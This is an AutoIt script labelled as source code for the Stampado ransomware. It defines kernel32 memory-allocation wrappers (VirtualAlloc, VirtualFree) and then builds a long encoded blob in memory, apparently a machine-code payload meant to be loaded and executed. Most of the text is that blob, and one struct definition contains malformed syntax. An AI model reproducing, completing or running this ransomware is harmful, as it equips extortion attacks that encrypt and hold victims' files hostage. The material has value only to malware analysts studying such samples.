#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.14.2
 Script Function: Stampado Ransomware source code
 
#ce ----------------------------------------------------------------------------

#NoTrayIcon
Global Const $0 = 4096
Global Const $1 = 4
Global Const $2 = 64
Global Const $3 = 32768
Func _0(Const $4 = @error, Const $5 = @extended)
	Local $6 = DllCall("kernel32.dll", "dword", "GetLastError")
	Return SetError($4, $5, $6[0])
EndFunc
Global Const $7 = "struct;long Left;long Top;long Right;long Bottom;endstruct"
Global Const $8 = "uint cbSize;uint fMask;uint fStyle;dword clrFore;dword clrBack;ptr lpText;uint cch;" & "int iImage;hwnd hwndChild;uint cxMinChild;uint cyMinChild;uint cx;handle hbmBack;uint wID;uint cyChild;uint cyMaxChild;" & "uint cyIntegral;uint cxIdeal;lparam lParam;uint cxHeader" & ((@OSVersion = "WIN_XP") """;" & $7 & ";uint uChevronState")
Global Const $9 = "dword Length;ptr Descriptor;bool InheritHandle"
Func _W($A, $B, $C, $D)
	Local $6 = DllCall("kernel32.dll", "ptr", "VirtualAlloc", "ptr", $A, "ulong_ptr", $B, "dword", $C, "dword", $D)
	If @error Then Return SetError(@error, @extended, 0)
	Return $6[0]
EndFunc
Func _Y($A, $B, $E)
	Local $6 = DllCall("kernel32.dll", "bool", "VirtualFree", "ptr", $A, "ulong_ptr", $B, "dword", $E)
	If @error Then Return SetError(@error, @extended, False)
	Return $6[0]
EndFunc
Global $F, $G
Global $H, $I, $J, $K
Global $L, $M
Global $N, $O
Global $P, $Q
Global $R, $S
Global Const $T = 0, $U = 1, $V = 2
Func _11()
	$F = 0
	_Y($G, 0, $3)
EndFunc
Func _12()
	If Not IsDllStruct($F) Then
		If @AutoItX64 Then
			Local $W = "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"
			$W &= "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"
			$W &= "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"
			$W &= "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"
			$W &= "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"
			$W &= "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"
			$W &= "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"
